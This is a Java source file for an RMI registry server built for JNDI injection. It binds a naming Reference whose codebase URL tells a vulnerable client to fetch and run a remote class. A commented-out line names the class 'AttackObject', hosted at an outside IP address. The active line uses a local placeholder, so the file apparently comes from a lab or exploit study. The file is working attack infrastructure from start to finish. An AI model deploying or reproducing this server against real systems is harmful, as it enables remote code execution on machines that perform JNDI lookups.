import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RegistryServer {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
//        Reference reference = new Reference("AttackObject", "AttackObject", "http://192.168.2.234/");
        Reference reference = new Reference("11111", "test", "http://127.0.0.1:80/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        System.out.println("bind test to rmi:127.0.0.1:80/test");
        registry.bind("obj", referenceWrapper);
        System.out.println("RegistryServer is running...");
    }
}
